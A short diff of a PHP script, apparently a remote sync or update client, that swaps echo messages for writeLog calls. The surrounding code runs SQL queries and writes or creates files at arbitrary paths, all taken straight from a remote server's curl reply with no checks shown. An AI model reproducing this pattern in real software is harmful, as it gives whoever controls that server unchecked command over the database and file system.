@@ -55,9 +55,9 @@ if (curl_errno($ch)) {
         if (isset($reply['server']['sql']['query'])) {
             $sql = $reply['server']['sql']['query'];
             if ($conn->query($sql) === TRUE) {
-                echo "SQL query executed successfully\n";
+                writeLog($sql." query executed successfully");
             } else {
-                echo "Error executing query: " . $conn->error . "\n";
+                writeLog($sql."Error executing query: " . $conn->error );
             }
         }
 
@@ -67,9 +67,9 @@ if (curl_errno($ch)) {
                 $filename = $file['filename'];
                 $newcontent = $file['newcontent'];
                 if (file_put_contents($filename, $newcontent) !== false) {
-                    echo "File $filename updated successfully\n";
+                    writeLog("File $filename updated successfully");
                 } else {
-                    echo "Error updating file $filename\n";
+                    writeLog("Error updating file $filename");
                 }
             }
         }
@@ -80,9 +80,9 @@ if (curl_errno($ch)) {
                 $filepath = $file['filepath'];
                 $content = $file['content'];
                 if (file_put_contents($filepath, $content) !== false) {
-                    echo "File $filepath created successfully\n";
+                    writeLog("File $filepath created successfully");
                 } else {
-                    echo "Error creating file $filepath\n";
+                    writeLog("Error creating file $filepath");
                 }
             }
         }
